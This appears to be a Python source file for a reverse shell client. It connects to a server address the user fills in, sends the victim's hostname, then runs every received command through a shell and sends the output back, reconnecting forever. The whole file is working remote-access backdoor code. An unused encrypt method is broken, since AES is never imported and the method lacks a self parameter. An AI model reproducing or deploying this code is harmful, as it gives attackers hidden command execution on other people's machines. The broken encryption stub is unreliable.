import os
import socket
import subprocess
import time
import signal
import sys
import struct


class Client():

    def __init__(self):
        ''' ADD YOUR SERVER IP BELOW '''
        self.serverHOST = ''
        self.serverPORT = 9999
        self.socket = None
    

    def encrypt(data, key, iv):
        # Pad Data as Needed [Data Len Required by AES = 128 bit]
        data += " " * (16 - len(data) % 16)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(bytes(data, "utf-8"))
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print(f'Could not close {str(e)}')
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print(f"Socket creation error: {str(e)}")
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHOST, self.serverPORT))
        except socket.error as e:
            print(f"Socket connection error: {str(e)}")
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print(f"Cannot send hostname to server: {str(e)}")
            raise
        return
    
    def printOutput(self, output_str):
        ''' Prints Cmd Output '''
        SentMSG = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(SentMSG)) + SentMSG)
        print(output_str)
        return

    def receiveCMD(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            print(f'Could not start communication with server: {str(e)}\n')
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = f"Command execution unsuccessful: {str(e)}\n"
            if output_str is not None:
                try:
                    self.printOutput(output_str)
                except Exception as e:
                    print(f'Cannot send command output: {str(e)}')
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print(f"Error on socket connections: {str(e)}")
            time.sleep(5)     
        else:
            break    
    try:
        client.receiveCMD()
    except Exception as e:
        print(f'Error in main: {str(e)}')
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()